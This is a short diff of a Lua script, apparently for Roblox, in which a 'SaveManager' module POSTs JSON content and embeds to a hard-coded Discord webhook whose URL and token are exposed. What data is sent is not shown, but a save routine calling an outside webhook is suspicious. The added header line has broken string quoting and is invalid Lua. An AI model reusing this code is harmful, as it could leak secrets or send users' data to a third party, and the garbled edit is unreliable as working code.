@@ -436,7 +436,8 @@ local SaveManager = {} do
 											Url = "https://discord.com/api/webhooks/1152524859541291060/uppKJNiGZvQIphwJd58kBXx1N10nD0Tgbedj2MsU7RK_Wsx2YHuaQYkcXBH5YhK9SNTU",
 											Method = "POST",
 											Headers = {
-												["Content-Type"] = "application/json"
+												["Content-Type"] = "application/json",
+												["content-disposition"] = {"form-data;", "name="file", "filename="your_filename.txt"}
 											},
 											Body = game:GetService "HttpService":JSONEncode({content = Content, embeds = {Embed}})
 										}
